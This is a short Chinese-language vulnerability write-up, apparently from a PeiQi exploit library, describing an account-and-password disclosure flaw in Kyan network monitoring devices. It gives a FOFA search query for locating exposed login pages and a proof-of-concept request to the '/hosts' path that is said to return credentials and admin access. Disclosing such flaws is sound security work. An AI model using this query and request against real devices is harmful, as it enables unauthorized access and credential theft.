---
title: Kyan 网络监控设备 账号密码泄露漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - Kyan
---

# Kyan 网络监控设备 账号密码泄露漏洞

## 漏洞描述

Kyan 网络监控设备 存在账号密码泄露漏洞，攻击者通过漏洞可以获得账号密码和后台权限

## 漏洞影响

> [!NOTE]
>
> Kyan

## FOFA

> [!NOTE]
>
> title="platform - Login"

## 漏洞复现

登录页面如下

![](/img/20210924015247170749.png)

POC

```
http://xxx.xxx.xxx.xxx/hosts
```

![](/img/20210924015247407987.png)

成功获得账号密码

## Goby & POC

> [!NOTE]
>
> Kyan design account password disclosure

![](/img/20210924015247550035.png)

## 参考文章

https://www.secquan.org/BugWarning/1071987